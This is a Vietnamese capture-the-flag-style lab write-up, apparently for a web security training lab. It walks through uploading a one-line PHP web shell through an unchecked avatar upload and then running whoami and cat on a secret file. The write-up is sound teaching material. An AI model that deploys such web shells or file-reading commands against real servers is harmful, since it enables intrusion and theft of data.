# Lab 01: Remote Code Execution via Web Shell Upload

## Mục tiêu
Khai thác chức năng tải lên ảnh đại diện không thực hiện bất kỳ kiểm tra nào để tải lên một webshell PHP, thực hiện thực thi mã nguồn từ xa (RCE) để lấy nội dung file `/home/carlos/secret`.

## Đề bài

<img src="images/01_rce-webshell-upload-2026-07-16-05-19-04.png" width="760" />
<br><br>

## Bước 1: Khảo sát chức năng tải lên file
Đăng nhập tài khoản `wiener` với mật khẩu `peter`. Trang thông tin cá nhân hiển thị chức năng tải lên ảnh đại diện:

<img src="images/01_rce-webshell-upload-2026-07-16-05-21-00.png" width="760" />
<br><br>

Thực hiện tải lên một tệp ảnh bất kỳ để bắt request trong Burp Suite:

<img src="images/01_rce-webshell-upload-2026-07-16-05-23-08.png" width="760" />
<br><br>

## Bước 2: Tải lên webshell và khai thác RCE
Sửa đổi tham số `filename` thành `rce.php` và thay đổi phần nội dung tệp thành mã độc PHP để thực thi câu lệnh hệ thống:
```php
<?php system($_GET['cmd']); ?>
```

<img src="images/01_rce-webshell-upload-2026-07-16-05-28-21.png" width="760" />
<br><br>

Sau khi tải lên thành công, truy cập đường dẫn của tệp webshell `/files/avatars/rce.php` và truyền câu lệnh kiểm tra thông qua tham số `cmd=whoami`:

<img src="images/01_rce-webshell-upload-2026-07-16-05-32-42.png" width="760" />
<br><br>

Hệ thống phản hồi tên người dùng thực thi lệnh là `carlos`. Tiếp tục đổi câu lệnh sang `cat /home/carlos/secret` để đọc mã bí mật:

<img src="images/01_rce-webshell-upload-2026-07-16-05-33-47.png" width="760" />
<br><br>

Sao chép mã bí mật này gửi lên hệ thống để hoàn thành bài lab.
